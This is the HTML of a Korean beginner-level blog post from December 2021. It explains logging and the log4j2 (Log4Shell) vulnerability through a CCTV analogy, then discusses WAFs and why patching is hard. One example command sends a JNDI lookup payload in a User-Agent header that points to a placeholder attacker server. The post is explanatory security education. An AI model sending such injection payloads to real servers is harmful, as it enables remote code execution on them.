@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	
+	
+	<meta name="naver-site-verification" content="39229cbfeba847b8c3ca64c0d77f7094d533ec91" />
+
+	<meta name="keyword" content="국비교육, 주니어 개발자, 코딩 입문, 부트캠프, 프로그래밍, 코딩, 개발자, 자바, Java, Spring, Algorithm, Computer science, Coding, Bootcamp, Programming, Function, Method, Language, 컴퓨터 공학, 비전공자, 최신 개발, 테크 기업, 유니콘" />
+	<meta name="description" content="개발 고인물이 알려주는 클론코딩, 학원, 국비교육, 부트캠프, 스터디, 유튜브에 안나오는 개발자가 생각하는 법 배우기!" />
+	<meta name="author" content="테크냥이">
+
+	<meta name="robots" content="index, follow"/>
+
+	<meta property="fb:app_id" content="299152852116172" /><title>로그, 로깅, 그리고 log4j 보안 취약점 사태 - 테크;냥이</title><link rel="icon" type="image/png" href=icons/favicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="로그, 로깅, 그리고 log4j 보안 취약점 사태" />
+<meta property="og:description" content="요즘 IT 업계의 뜨거운 이슈가 되었던 JAVA 의 log4j2 사태에 대한 IT 입문자들을 위한 자세한 설명" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tech-kitty.com/003_issues/003_issues-00001/" /><meta property="article:section" content="003_issues" />
+<meta property="article:published_time" content="2021-12-26T15:08:00+09:00" />
+<meta property="article:modified_time" content="2021-12-26T15:08:00+09:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="로그, 로깅, 그리고 log4j 보안 취약점 사태"/>
+<meta name="twitter:description" content="요즘 IT 업계의 뜨거운 이슈가 되었던 JAVA 의 log4j2 사태에 대한 IT 입문자들을 위한 자세한 설명"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://tech-kitty.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://tech-kitty.com/css/main.css" /><link rel="stylesheet" type="text/css" href="https://tech-kitty.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+
+	
+	<script src="https://tech-kitty.com/js/main.js"></script>
+	<script src="https://tech-kitty.com/js/custom.js"></script>
+
+	<script src="https://tech-kitty.com/js/jquery-3.6.0.slim.min.js"></script>
+
+	<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+	<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://tech-kitty.com/">
+	<h1 class="site-title"><a href="https://tech-kitty.com/">테크;냥이</a></h1>
+	<div class="site-description"><h2>다시 이해하는 IT 개발 이야기</h2><nav class="nav social">
+			<ul class="flat"></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">최근 글</a>
+			</li>
+			
+			<li>
+				<a href="/001_coding_start">개발자 되기</a>
+			</li>
+			
+			<li>
+				<a href="/003_issues">IT 이슈</a>
+			</li>
+			
+			<li>
+				<a href="/tags">태그</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">로그, 로깅, 그리고 log4j 보안 취약점 사태</h1>
+			<div class="meta">&mdash; Dec 26, 2021</div>
+		</div>
+
+		<div class="markdown">
+			<p>컴퓨터 역사 중에 가장 최악의 보안 결함이라 할 수 있는 이 사태에 대해 우리 코린이들을 위한 설명들이 너무나 부족해 보인다.<br>
+코딩이나 IT 를 전혀 모르는 이들에게 이해가 쉽도록 설명을 해보려 한다.</p>
+<h3 id="무엇이-이슈가-되었나">무엇이 이슈가 되었나?</h3>
+<p>일단 자바(JAVA) 언어를 이용한 서버들의 취약점이다. 약한 부분이 드러나서 공격을 당할 위험에 처해있다는 뜻이다. 전세계적으로 자바는 매우 많이 사용되고 있고, 자바를 이용한 컴퓨터(서버 뿐이지만)도 매우 많이 운영되고 있다.</p>
+<p>이 컴퓨터들 중 log4j (아래에서 자세히) 를 사용하는 것들은 대부분 이 취약한 부분을 가지고 있다는 것이다.<br>
+그리고 우리나라도 많은 크고 작은 회사들이 자바를 사용하고 있다. 흔히 들어왔던 스프링(Spring) 이나 스프링 부트 프레임워크, 전자정부 프레임워크를 사용하는 업계 대부분이 위험에 노출되었다는 얘기다.</p>
+<p>그리고 요즘에 들어선 여러 중,대형 서비스들의 장애(뭔가 장바구니가 안되고, 홈페이지 접속이 안되거나 등등)이 이와 연관성은 있지 않을까 염려가 있긴 하다.</p>
+<p>그냥 그럴 확률도 있다는 것이다. 꼭 이런 이슈가 터지고 나서 왜 잘 되던 서비스가 안될까 라는 의문점은 우리 코린이들은 생각해 볼 수 있어야 되지 않을까?</p>
+<h3 id="이런-얘기들을-하자">이런 얘기들을 하자</h3>
+<ul>
+<li>log4j 의 중 로그 (log) 라는 단어가 먼저 무슨 소리인지 알아야 한다.</li>
+<li>어떻게 공격당하기 쉬울까?</li>
+<li>어떻게 막고 어떻게 예방하지?</li>
+</ul>
+<h4 id="로그-log-브이로그v-log">로그, log, 브이로그(V-log)</h4>
+<p>로그가 뭘까? 요즘 브이로그(Video-log)가 한창 유행이다. 뭔지는 몰라도 접해보기는 했을 것이다. 연예인이나 일반인 유튜브나 여러 매체를 통해 우리는 로그를 접하고 있다.</p>
+<blockquote>
+<p>로그는 영어다. 그리고 한국어로 &ldquo;기록&rdquo; 이다.</p>
+</blockquote>
+<p>우리 컴퓨터들은 24시간동안 사람의 도움없이 열심히 돌고 있다. 밤낮없이 돌아가는 공장이라고 볼 수 있겠다.<br>
+그럼 우리는 공장이 돌아갈때 아무런 문제 없이 돌아간다고 안심할 수 있을까?</p>
+<p>그래서 우리는 공장이나 어떤 장소에서든 CCTV 를 두어 기록을 하고 있고, 나중에 문제가 생기거나 논란이 생길 경우 CCTV 의 기록을 통해 증거를 찾게 된다.</p>
+<p>컴퓨터, 즉 서버도 사람이 모니터 화면을 뚫어져라 보고 있지 않으니 CCTV 처럼 로그를 기록하는 그 무언가를 두는 것이다.<br>
+그래서 나중에라도 &ldquo;도난&quot;이나 &ldquo;사고&quot;등이 터졌을 때 이의 자세한 원인이나 해결을 위해 이 기록을 활용하는 것이다.</p>
+<p><img src="/images/003_issues/003_issues-00001/01_cctv.png" alt="Server logging"></p>
+<h6 id="로그-server-log-서버에서-일어나는-일들을-문자로-어딘가에-기록한다">[로그, Server Log] 서버에서 일어나는 일들을 문자로 어딘가에 기록한다.</h6>
+<h4 id="단순히-기록만-하는데-왜-공격당하지">단순히 기록만 하는데 왜 공격당하지?</h4>
+<p>CCTV 처럼 단순히 기록만 하는데서 끝났으면 아무런 일이 일어나지 않을 것이다.<br>
+지금의 이 사태는 CCTV 에 눈만 달아 놓고 어딘가에 기록만 열심히 하면 되었을 텐데, 역시나 IT 인들은 이걸 멋지게 발전 시켰다.<br>
+이 CCTV 로그 기능에 손발을 달기 시작한다.</p>
+<p><img src="/images/003_issues/003_issues-00001/02_cctv.png" alt="CCTV Robot"></p>
+<h6 id="멋진-cctv-로봇-이제는-전보다-똑똑한-cctv-가-되었다">[멋진 CCTV 로봇] 이제는 전보다 똑똑한 CCTV 가 되었다.</h6>
+<p>분명히 멋진 일이지만, 이 손에 무엇을 쥐어주느냐를 신경쓰지 못했다.<br>
+그 누구도 이렇게 사용하면 될거라는 창의적인 생각을 못한 것이다.</p>
+<p><img src="/images/003_issues/003_issues-00001/003_attack.png" alt="CCTV Robot"></p>
+<h6 id="무서운-cctv-로봇-그-손에-몽둥이를-들게-하는-법을-찾아냈다">[무서운 CCTV 로봇] 그 손에 몽둥이를 들게 하는 법을 찾아냈다.</h6>
+<h4 id="그럼-어떻게-cctv-로깅이-나쁜짓을-하게-만들-수-있을까">그럼 어떻게 CCTV (로깅)이 나쁜짓을 하게 만들 수 있을까?</h4>
+<p>원리는 단순했다. CCTV (이제부터는 로거, Logger 라고 부르자)는 눈이 달려 있고, 기록하는 일만 하면 되는데 손,발을 달아 놓고 이것을 움직이게 하고 싶다면 어떻게 해야 할까? 이렇게 해라 저렇게 해라라는 명령을 전달해야 움질일테니, 쳐다보고 있는 눈에 특정한 움직임을 넣는다면 되겠다라는 생각을 한 것이다.</p>
+<p><img src="/images/003_issues/003_issues-00001/04_catch-mind.jpg" alt="눈으로 알아맞추기"></p>
+<h6 id="캐치마인드-기록그림으로-무언가를-맞추는-게임-명령을-알아맞추면-되는-것과-원리가-같다">[캐치마인드] 기록(그림)으로 무언가를 맞추는 게임, 명령을 알아맞추면 되는 것과 원리가 같다.</h6>
+<p>로거가 눈으로 쳐다보면서 기록을 하고 있는데, 특정한 움직임이 보이면 명령으로 인식해서 그 명령을 열심히 수행하는 것이다.</p>
+<p><img src="/images/003_issues/003_issues-00001/05_cctv_command.jpg" alt="로거 명령"></p>
+<h6 id="명령-전달-특정한-행동은-명령이라고-먼저-로거cctv를-훈련-시켜놓으면-된다">[명령 전달] 특정한 행동은 명령이라고 먼저 로거(CCTV)를 훈련 시켜놓으면 된다.</h6>
+<p>우리의 성실한 로거는 그 명령대로 열심히 수행만 하면 되었고,<br>
+그게 그냥 서버 관리자 입장에서 실행시키고 싶지 않은 명령이었을 뿐이다.<br>
+이렇게 공격자들은 창의적이다.</p>
+<h4 id="실제-소스코드는-어떤-그림일까">실제 소스코드는 어떤 그림일까?</h4>
+<p><img src="/images/003_issues/003_issues-00001/06_cctv_source.jpg" alt="log4j2 vulnerability"></p>
+<h6 id="바깥에서-들어온-명령-원래는-기록만-하면-되는데-특정-행동을-바깥웹-브라우저에서-임의로-넣는다">[바깥에서 들어온 명령] 원래는 기록만 하면 되는데, 특정 행동을 바깥(웹 브라우저)에서 임의로 넣는다.</h6>
+<p>바깥에서 이렇게 쉽게 접근이 문제였다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># 간단한 명령어(${jndi...}) 를 넣을 수 있다.</span>
+$ curl 네이X.com -H <span style="color:#e6db74">&#39;User-Agent: ${jndi:ldap://나쁜놈서버/나쁜행동명령}&#39;</span>
+</code></pre></div><p><img src="/images/003_issues/003_issues-00001/07_log_source.jpg" alt="log4j2 record"></p>
+<h6 id="log4j-기록-서버-안쪽에-이렇게-문자열로-저장이-되는-형태다">[log4j 기록] 서버 안쪽에 이렇게 문자열로 저장이 되는 형태다.</h6>
+<p>실제로 저 &ldquo;나쁜행동명령&quot;은 간단한 내용만 들어있다.<br>
+&ldquo;더 강하고 악랄한 놈을 데려와라&rdquo;
+라는 내용이 있다면 어떻게 될까?</p>
+<h4 id="어떤-공격들이-가능한걸까">어떤 공격들이 가능한걸까?</h4>
+<p>언뜻 생각해보면, 공장 CCTV 안쪽으로 명령을 집어서 공격자가 시키고 싶은 걸 하는 게 공격인데, 이상한 생각이 든다.<br>
+명령이라는 건 어떻게 수행하라는 &ldquo;정해진 계획&quot;이다.<br>
+근데 정해진 계획이란건 틀어지는게 인지상정.
+왜냐하면 공장(서버) 안쪽은 어떻게 생겼는지 바깥에서는 보이지 않는 상태다. 그런데도 공격이 먹힌다. 왜 그럴까?</p>
+<p>하나 예를 들어보자, 공격자가 명령문을 이렇게 작성했다 치자.</p>
+<p><u>명령 : &ldquo;서버안쪽에 들어가면 빨간색이 칠해진 문이 있을거야, 그 문 손잡이를 오른쪽으로 돌려&rdquo;</u></p>
+<p>우리가 들여보낸 이 명령문은 (흔히 NetBot 이라고 부른다, Network Bot) 착실히 그 명령을 수행한다.<br>
+성공한다면 문이 성공적으로 열리며, 공격자는 서버 안쪽에 쉽게 들어갈 수 있을 것이다.</p>
+<p>그런데, 빨간색 문이 없다면?<br>
+문 손잡이가 있긴 한데, 왼쪽으로 돌려야 열린다면?</p>
+<p>아마 그 공격 명령문은 실패해서 문이 열리지 않을 것이다.<br>
+그런데 대부분의 서버에 이 간단한 공격문들이 성공했다.
+어떻게 된 것일까?</p>
+<blockquote>
+<p>가장 막강한 계획은 모든 경우의 수를 생각하면 된다.</p>
+</blockquote>
+<p>매우 간단하다. 모든 예상되는 경우의 공격문들을 여러개 준비하면 된다.<br>
+그리고 그걸 전부 하나씩 실행시켜보면 되는 것이다.</p>
+<p><img src="/images/003_issues/003_issues-00001/08_log_source.jpg" alt="무차별 대입공격"></p>
+<h6 id="무차별-대입공격-한놈이라도-걸릴-때까지-때리면-되는-것이다">[무차별 대입공격] 한놈이라도 걸릴 때까지 때리면 되는 것이다.</h6>
+<p>이렇게 &ldquo;종합선물세트&quot;를 준비해놓는다. 공격 준비는 항상 섬세하고 무식하게 해야 한다.</p>
+<p><img src="/images/003_issues/003_issues-00001/09_log_source.jpg" alt="종합선물세트"></p>
+<h6 id="종합선물세트-일단-되던-안되던-다-서버에-받아놔-보자">[종합선물세트] 일단 되던 안되던 다 서버에 받아놔 보자.</h6>
+<p><img src="/images/003_issues/003_issues-00001/10_log_source.jpg" alt="CPU 마다 명령을"></p>
+<h6 id="cpu-별도로-하나만-준비하면-공격이-실패할-확률이-높다-그래서-모두-준비하자">[CPU 별도로] 하나만 준비하면 공격이 실패할 확률이 높다. 그래서 모두 준비하자.</h6>
+<h4 id="그래서-현실은-어떻게-막을까">그래서 현실은, 어떻게 막을까?</h4>
+<p>공격이 들어온다, 여러분이라면 어떻게 막을까?<br>
+간단하게 가디언(보안관, 경찰&hellip;등등)들을 여러명 두면 간단할것이다.<br>
+하지만 여러분집에 보안경찰을 따로 고용한다면, 그리고 1명이 아니라 여러명 둔다면 월급은 얼마나 줘야 할까?</p>
+<p>그렇다 보안은 두터울 수록 좋지만, 그건 곧 돈과 직결된다.<br>
+대부분의 돈 못 버는 기업들은 이런곳에 돈을 쓰지 않는다. 월급 주기도 빠듯하기 때문에.</p>
+<blockquote>
+<p>응! 그래서 대부분은 기업은 그냥 소 읽고 외양간을 고친다.</p>
+</blockquote>
+<p>기업에서 쓰는 백신도 돈이고, 방화벽도 돈이고 모든게 돈!돈!돈!이다.
+그냥 이런것에 뚫리지 않기를 기도한다. 현실은 그렇다.</p>
+<p><img src="/images/003_issues/003_issues-00001/11_log_source.gif" alt="IT 는 기도가 필요하다"></p>
+<h6 id="개발에는-종교가-이-험난한-개발-세계에서는-어떤-신이라도-믿게-된다">[개발에는 종교가..] 이 험난한 개발 세계에서는 어떤 신이라도 믿게 된다.</h6>
+<p>하지만 돈이 벌린다 싶으면 보안에 돈을 들이기 시작한다.</p>
+<p><img src="/images/003_issues/003_issues-00001/12_log_source.jpg" alt="log4j 대응방법"></p>
+<h6 id="침해-대응-메뉴얼-간단하게-각-상황에-맞는-대응방법을-표현한다author-loic-castel-atos-ti-france">[침해 대응 메뉴얼] 간단하게(?) 각 상황에 맞는 대응방법을 표현한다.(Author: Loic Castel, Atos TI France)</h6>
+<p>우선 흔한 AWS (Amazon web service) 의 웹 방화벽(WAF)를 우리 서버에 들어오기 전의 관문으로 놔둔다.
+하지만 이건 취약점이 알려지고 나서 2주나 지나서야 막기 시작했다. 오히려 막기 시작했다는게 다행일 정도다.</p>
+<p><img src="/images/003_issues/003_issues-00001/13_waf.png" alt="WAF"></p>
+<h6 id="waf-web-application-firewall-waf-웹브라우저에서-들어오는-모든-트래픽을-감시한다-출처httpswwwcloudflarecomimglearningddosglossarywafwafpng">[WAF] Web Application Firewall (WAF), 웹브라우저에서 들어오는 모든 트래픽을 감시한다. <a href="https://www.cloudflare.com/img/learning/ddos/glossary/waf/waf.png">출처</a></h6>
+<p>하지만 공격은 이미 시작되었고, WAF 의 대응은 언제 될지 모른다.<br>
+따라서 우리는 모든 경로, 어디든 비집고 들어올 수 있는 경로에 대해 대비를 해야 한다.</p>
+<blockquote>
+<p>흔한 log4j2 의 버전만 최신버전으로 업데이트 하면 되지 않나요?는 X에게 줘버리자.</p>
+</blockquote>
+<p><img src="/images/003_issues/003_issues-00001/14_defence_plan.png" alt="Defence Scenario"></p>
+<h6 id="defence-scenario-한-두군데가-아니다-쉽게-생각하면-안된다-shielding-and-mitigation-mind-map-author-loic-castel-atos-ti-france">[Defence Scenario] 한 두군데가 아니다, 쉽게 생각하면 안된다 (Shielding and Mitigation mind map. Author: Loic Castel, Atos TI France)</h6>
+<p>버전만 업데이트 하면 된다는 발상은 현실과 너무 동떨어져 있다.<br>
+다음과 같이 현실적인 부분을 생각해야 한다.
+(CCTV 를 로거라고 얘기하겠다)</p>
+<ol>
+<li>로거를 한곳만 달아놓지는 않았을 것이다. (서버가 1,000대면&hellip;)</li>
+<li>구버전 로거도 있고, 신버전 로거 도 있는데, 이번 취약점은 신버전 중 일부에서 발견되었다. 구버전 로거는 다른 취약점이 있으나 고쳐주지 않으므로, 알아서 업그레이드 하란다.</li>
+<li>로거를 달아놓은 곳을 모두 아는 사람이 없다. 역사가 오래된 소스코드나 큰 회사인 경우에 흔한 일이다.</li>
+<li>구버전 로거를 업그레이드 했다고 착각할 수 있다. 모든 회사의 대응능력이 같지 않다.</li>
+<li>유지보수 할 수 있는 인력이나 개발자, 용역회사가 연락이 안된다. 즉 못 고친다.</li>
+<li>돈이 없다.</li>
+</ol>
+<p>어디서부터 작업해야 할지 모르겠고, 어디까지 해야 전부 방어가 된 것인지 장담할 수 없는게 현실인것이다.
+그래서 서버는 어떻게 하긴 힘드니, 바깥에 보안(방화벽, WAF)에만 신경을 쓸 수 있게 된다.</p>
+<p><img src="/images/003_issues/003_issues-00001/15_inside_server.png" alt="Inside server"></p>
+<h6 id="legacy-source-유구한-역사를-자랑하는-it에-고인물도-많고-고인소스도-많다">[Legacy source] 유구한 역사를 자랑하는 IT에 고인물도 많고 고인소스도 많다.</h6>
+<h4 id="마치면서">마치면서</h4>
+<p>이번 취약점은 알려지면서 굉장히 많은 공격을 유발했다. 그만큼 누구나 따라하기 쉬웠으며, 사용하는 서버도 많았다.
+공격은 단순하고 매우 강력했다. 그 어떤것이든 할 수 있는 환경으로 만드는 공격이었으니.
+예방을 하면 되지 않나 하겠지만, 예방이란건 예측이 가능할때만 가능한 것이다.</p>
+<p>결과만 가지고 문제를 삼으면 안되는 것이다. 더구나 이 취약점은 2017년 11월 18일에 새롭게 추가된 기능을 이용한 것이어서
+약 4년간 (현재 2021-12) 아는 사람만 쉬쉬하면서 알고 있었고, 확실한 대응책이 나올때까지 비밀인 상태였다.</p>
+<p>이런 종류의 취약점은 예방을 할 수 없는게 당연하다. 새로운 기능이 어떻게 쓰일지는 아무도 모르기 때문이다.<br>
+단지 필요한것은 이미 발견된 취약점을 해결하는게 또 다른 중요한 일이란 것이다.</p>
+<p><u>물론 과거의 고인 소스들에 숨겨져 있는 취약점을 해결해야 한다고 주장할 것이다.<br>
+그렇게 하고 싶으면 칼퇴를 포기해라.</u></p>
+<h4 id="참고-링크">참고 링크</h4>
+<p><a href="https://cve.report/CVE-2021-42550">CVE-2021-42550</a></p>
+<p><a href="https://cve.report/CVE-2021-44228">CVE-2021-44228</a></p>
+<p><a href="https://cve.report/CVE-2021-45046">CVE-2021-45046</a></p>
+<p><a href="https://cve.report/CVE-2021-45105">CVE-2021-45105</a></p>
+<p><a href="https://cve.report/CVE-2021-4104">CVE-2021-4104</a></p>
+<p><a href="https://www.nozominetworks.com/blog/critical-log4shell-apache-log4j-zero-day-attack-analysis/">critical-log4shell-apache-log4j-zero-day-attack-analysis</a></p>
+<p><a href="https://atos.net/en/lp/securitydive/log4shell-unauthenticated-rce-0-day-exploit">log4shell-unauthenticated-rce-0-day-exploit</a></p>
+<p><a href="https://logging.apache.org/log4j/2.x/">log4j2</a></p>
+<p><a href="https://jira.qos.ch/browse/LOGBACK-1591">LOGBACK-1591</a></p>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/log4j2">log4j2</a></li>
+								
+								<li><a href="/tags/log4shell">log4shell</a></li>
+								
+								<li><a href="/tags/cve-2021-44228">CVE-2021-44228</a></li>
+								
+								<li><a href="/tags/cve-2021-45046">CVE-2021-45046</a></li>
+								
+								<li><a href="/tags/cve-2021-45105">CVE-2021-45105</a></li>
+								
+								<li><a href="/tags/cve-2021-4104">CVE-2021-4104</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> 수학을 알지 못하는 사람들은 자연의 아름다움, 궁극의 아름다움에 도달한 느낌은 갖기 힘들 것이다. 자연을 배우고 싶다면, 자연을 정말로 이해하고 싶다면, 자연이 말하고 있는 언어를 이해할 필요가 있다. </div>
+		<div> - Richard Phillips Feynman </div>
+	</nav>
+
+	
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-3XQ94GTJBK"></script>
+	<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag(){dataLayer.push(arguments);}
+		gtag('js', new Date());
+
+		gtag('config', 'G-3XQ94GTJBK');
+	</script><div style="min-width:100%; width:100%;background-color: #EEEEEE;margin-top: 20px;border-radius: 4px;">
+    
+    <div id="fb-comments" class="fb-comments"
+         data-href="https://understand.tech-kitty.com/#/"
+         data-width="100%"
+         data-numposts="10"
+         data-lazy="true"
+    ></div>
+</div>
+<style>
+     
+    .fb_iframe_widget_fluid_desktop, .fb_iframe_widget_fluid_desktop span, .fb_iframe_widget_fluid_desktop iframe {
+        max-width: 99% !important;
+        width: 99% !important;
+        text-align: center;
+        padding-top: 2px;
+    }
+</style>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var darkModeEnabled = false;
+
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            console.log('mode-detect : ', 'dark');
+            darkModeEnabled = true;
+        }else{
+            console.log('mode-detect : ', 'white');
+            darkModeEnabled = false;
+        }
+
+        var loc = document.getElementById('fb-comments');
+        loc.setAttribute('data-href', location.href);
+        loc.setAttribute('data-colorscheme', darkModeEnabled ? "dark":"light");
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+
+        dsq.setAttribute('src', "https://connect.facebook.net/ko_KR/sdk.js#xfbml=1&version=v12.0");
+        dsq.setAttribute('nonce', "YGoGPMMr");
+        dsq.setAttribute('crossorigin', "anonymous");
+
+        (document.getElementsByTagName('body')[0]).appendChild(dsq);
+    });
+</script></div>
+
+
+
+
+</body>
+</html>
